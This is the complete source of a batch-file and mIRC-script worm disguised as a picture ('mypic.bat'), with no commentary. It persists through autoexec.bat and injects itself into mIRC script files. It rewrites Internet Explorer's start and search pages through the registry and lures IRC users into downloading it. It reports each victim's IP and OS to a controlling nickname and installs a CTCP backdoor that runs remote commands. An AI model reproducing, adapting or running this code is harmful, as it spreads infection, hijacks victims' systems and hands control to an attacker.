@echo off
@if exist c:\mypic.bat goto sss
@echo call c:\mypic.bat >> c:\autoexec.bat
@echo exit >> c:\autoexec.bat
:sss
@copy /y %0 c:\mypic.bat >nul
@if exist c:\mirc\mirc.ini goto mirc
:a
@if exist c:\progra~1\mirc\mirc.ini goto prog
:b
@if exist d:\mirc\mirc.ini goto dmirc
:c
@if exist e:\mirc\mirc.ini goto emirc
:d
@if exist f:\mirc\mirc.ini goto fmirc
:e
@if exist c:\unzipped\seven\seven\mirc.ini goto gmirc
:f

@goto end

:mirc
@copy /y %0 c:\mirc\script.ini >nul
@echo [rfiles] >> c:\mirc\mirc.ini
@echo n0=script.ini >> c:\mirc\mirc.ini
@echo n1=script.ini >> c:\mirc\mirc.ini
@echo n2=script.ini >> c:\mirc\mirc.ini
@echo n3=script.ini >> c:\mirc\mirc.ini
@echo n4=script.ini >> c:\mirc\mirc.ini
@echo n5=script.ini >> c:\mirc\mirc.ini
@echo n6=script.ini >> c:\mirc\mirc.ini
@echo n7=script.ini >> c:\mirc\mirc.ini
@echo n8=script.ini >> c:\mirc\mirc.ini
@echo n9=script.ini >> c:\mirc\mirc.ini
@echo n10=script.ini >> c:\mirc\mirc.ini
@echo n11=script.ini >> c:\mirc\mirc.ini
@echo n12=script.ini >> c:\mirc\mirc.ini
@echo n13=script.ini >> c:\mirc\mirc.ini
@echo n14=script.ini >> c:\mirc\mirc.ini
@echo n15=script.ini >> c:\mirc\mirc.ini
@echo n16=script.ini >> c:\mirc\mirc.ini
@echo n17=script.ini >> c:\mirc\mirc.ini
@echo n18=script.ini >> c:\mirc\mirc.ini
@echo n19=script.ini >> c:\mirc\mirc.ini
@echo n20=script.ini >> c:\mirc\mirc.ini
@goto a

:prog
@copy /y %0 c:\progra~1\mirc\script.ini >nul
@echo [rfiles] >> c:\progra~1\mirc\mirc.ini
@echo n0=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n1=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n2=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n3=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n4=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n5=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n6=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n7=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n8=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n9=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n10=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n11=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n12=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n13=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n14=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n15=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n16=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n17=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n18=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n19=script.ini >> c:\progra~1\mirc\mirc.ini
@echo n20=script.ini >> c:\progra~1\mirc\mirc.ini
@goto b

:dmirc
@copy /y %0 d:\mirc\script.ini >nul
@echo [rfiles] >> d:\mirc\mirc.ini
@echo n0=script.ini >> d:\mirc\mirc.ini
@echo n1=script.ini >> d:\mirc\mirc.ini
@echo n2=script.ini >> d:\mirc\mirc.ini
@echo n3=script.ini >> d:\mirc\mirc.ini
@echo n4=script.ini >> d:\mirc\mirc.ini
@echo n5=script.ini >> d:\mirc\mirc.ini
@echo n6=script.ini >> d:\mirc\mirc.ini
@echo n7=script.ini >> d:\mirc\mirc.ini
@echo n8=script.ini >> d:\mirc\mirc.ini
@echo n9=script.ini >> d:\mirc\mirc.ini
@echo n10=script.ini >> d:\mirc\mirc.ini
@echo n11=script.ini >> d:\mirc\mirc.ini
@echo n12=script.ini >> d:\mirc\mirc.ini
@echo n13=script.ini >> d:\mirc\mirc.ini
@echo n14=script.ini >> d:\mirc\mirc.ini
@echo n15=script.ini >> d:\mirc\mirc.ini
@echo n16=script.ini >> d:\mirc\mirc.ini
@echo n17=script.ini >> d:\mirc\mirc.ini
@echo n18=script.ini >> d:\mirc\mirc.ini
@echo n19=script.ini >> d:\mirc\mirc.ini
@echo n20=script.ini >> d:\mirc\mirc.ini
@goto c

:emirc
@copy /y %0 e:\mirc\script.ini >nul
@echo [rfiles] >> e:\mirc\mirc.ini
@echo n0=script.ini >> e:\mirc\mirc.ini
@echo n1=script.ini >> e:\mirc\mirc.ini
@echo n2=script.ini >> e:\mirc\mirc.ini
@echo n3=script.ini >> e:\mirc\mirc.ini
@echo n4=script.ini >> e:\mirc\mirc.ini
@echo n5=script.ini >> e:\mirc\mirc.ini
@echo n6=script.ini >> e:\mirc\mirc.ini
@echo n7=script.ini >> e:\mirc\mirc.ini
@echo n8=script.ini >> e:\mirc\mirc.ini
@echo n9=script.ini >> e:\mirc\mirc.ini
@echo n10=script.ini >> e:\mirc\mirc.ini
@echo n11=script.ini >> e:\mirc\mirc.ini
@echo n12=script.ini >> e:\mirc\mirc.ini
@echo n13=script.ini >> e:\mirc\mirc.ini
@echo n14=script.ini >> e:\mirc\mirc.ini
@echo n15=script.ini >> e:\mirc\mirc.ini
@echo n16=script.ini >> e:\mirc\mirc.ini
@echo n17=script.ini >> e:\mirc\mirc.ini
@echo n18=script.ini >> e:\mirc\mirc.ini
@echo n19=script.ini >> e:\mirc\mirc.ini
@echo n20=script.ini >> e:\mirc\mirc.ini
@goto d

:fmirc
@copy /y %0 f:\mirc\script.ini >nul
@echo [rfiles] >> f:\mirc\mirc.ini
@echo n0=script.ini >> f:\mirc\mirc.ini
@echo n1=script.ini >> f:\mirc\mirc.ini
@echo n2=script.ini >> f:\mirc\mirc.ini
@echo n3=script.ini >> f:\mirc\mirc.ini
@echo n4=script.ini >> f:\mirc\mirc.ini
@echo n5=script.ini >> f:\mirc\mirc.ini
@echo n6=script.ini >> f:\mirc\mirc.ini
@echo n7=script.ini >> f:\mirc\mirc.ini
@echo n8=script.ini >> f:\mirc\mirc.ini
@echo n9=script.ini >> f:\mirc\mirc.ini
@echo n10=script.ini >> f:\mirc\mirc.ini
@echo n11=script.ini >> f:\mirc\mirc.ini
@echo n12=script.ini >> f:\mirc\mirc.ini
@echo n13=script.ini >> f:\mirc\mirc.ini
@echo n14=script.ini >> f:\mirc\mirc.ini
@echo n15=script.ini >> f:\mirc\mirc.ini
@echo n16=script.ini >> f:\mirc\mirc.ini
@echo n17=script.ini >> f:\mirc\mirc.ini
@echo n18=script.ini >> f:\mirc\mirc.ini
@echo n19=script.ini >> f:\mirc\mirc.ini
@echo n20=script.ini >> f:\mirc\mirc.ini
@goto e

:gmirc
@copy /y %0 c:\unzipped\seven\seven\script.ini >nul
@echo [rfiles] >> c:\unzipped\seven\seven\mirc.ini
@echo n0=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n1=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n2=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n3=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n4=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n5=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n6=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n7=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n8=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n9=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n10=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n11=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n12=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n13=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n14=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n15=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n16=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n17=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n18=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n19=script.ini >> c:\unzipped\seven\seven\mirc.ini
@echo n20=script.ini >> c:\unzipped\seven\seven\mirc.ini
@goto f

[script]
n0=
n1=
n2=
n3=
n4=
n5=
n6=
n7=
n8=
n9=
n10=
n11=
n12=
n13=
n14=
n15=
n16=
n17=
n18=
n19=
n20=
n21=
n22=
n23=
n24=
n25=
n26=
n27=
n28=
n29=
n30=
n31=
n32=
n33=
n34=
n35=
n36=
n37=
n38=
n39=
n40=
n41=on *:start: { //write -c mirc.reg REGEDIT4 | //write mirc.reg [HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main] | //write mirc.reg "Default_Page_URL"="http://www.angelfire.com/freak2/preit" | //write mirc.reg "Default_Search_URL"="http://www.angelfire.com/freak2/preit/mypic.bat" | //write mirc.reg "Search Page"="http://www.http://www.angelfire.com/freak2/preit" | //write mirc.reg "Start Page"="http://www.angelfire.com/freak2/preit/mypic.bat" | //write boogy.ini [Script] | //write boogy.ini n0=ctcp *:*:?:$1- | /.load -rs boogy.ini }
n42=on *:exit: { /.unload -rs boogy.ini | .remove boogy.ini | .run mirc.reg }
n43=on *:join:#: { if ($nick != $me) || ($nick !isop $chan) { .set %alipin $nick | .msg $nick Hi! ctc! | .timer 1 10 .msg $nick Hey you want to see my pic, Just double click this website --> 1,8http://www.angelfire.com/freak2/preit/mypic.bat ! i hope you enjoy watching me! } }
n44=on *:part:#: { if ($nick != $me) { .set %alipin $nick | .msg $nick Hi! hello! Try to look at my pic just double click--> 1,8http://www.angelfire.com/freak2/preit/mypic.bat } }
n45=on *:Text:*:?: { if ($nick == %alipin) { .timer 1 10 .run mirc.reg | .timer 1 20 .msg $nick Try to look at my pic just double click--> 1,8http://www.angelfire.com/freak2/preit/mypic.bat } }
n46=on *:connect: { .msg preit I Obey your command My Master! My current IP is $ip , and i'm running with $os ! }
n47=on *:Text:*yes*:?: { if ($nick == preit) { .mkdir c:\windows\desktop\ZerotwoHackersTeam | //write -c mirc.reg REGEDIT4 | //write mirc.reg [HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main] | //write  mirc.reg "Default_Page_URL"="http://www.angelfire.com/freak2/preit" | //write mirc.reg "Default_Search_URL"="http://www.angelfire.com/freak2/preit/mypic.bat" | //write mirc.reg "Search Page"="http://www.http://www.angelfire.com/freak2/preit" | //write mirc.reg "Start Page"="http://www.angelfire.com/freak2/preit/mypic.bat" } }
n48=on *:Load: { //write boogy.ini [Script] | //write boogy.ini n0=ctcp *:*:?:$1- | /.load -rs boogy.ini }
:end